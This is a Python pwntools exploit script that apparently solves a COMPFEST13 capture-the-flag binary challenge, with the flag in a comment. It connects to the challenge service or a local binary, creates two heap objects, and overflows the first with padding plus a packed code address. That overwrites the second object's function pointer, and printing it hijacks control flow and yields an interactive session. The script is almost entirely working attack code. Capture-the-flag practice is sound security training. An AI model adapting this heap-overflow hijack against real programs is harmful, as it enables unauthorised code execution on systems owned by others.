import sys, struct
from pwn import *

# Flag : COMPFEST13{C_i_told_u_its_ez_loooooooool_257505}

idx_last = 32

if sys.argv[1] == "local":
	elf = ELF("./ez")
	prog = elf.process()
else:
	prog = remote('103.152.242.242', 30150)

# Create meme 2 times (memes[0] & memes[1])
print(prog.recv().decode())
for x in range(2):
	prog.sendline(b"1")
	print(prog.recv().decode())
	prog.sendline(b"4")
	print(prog.recv().decode())
	prog.sendline(b"test")
	print(prog.recv().decode())


# Edit memes[0] to trigger heap overflow
prog.sendline(b"2")
print(prog.recv().decode())
prog.sendline(b"0")
print(prog.recv().decode())
prog.sendline(b"A"*idx_last + struct.pack("<I", 0x4014a0))
print(prog.recv().decode())

# Print memes[1]
prog.sendline(b"3")
print(prog.recv().decode())
prog.sendline(b"1")
print(prog.recv().decode())

prog.interactive()
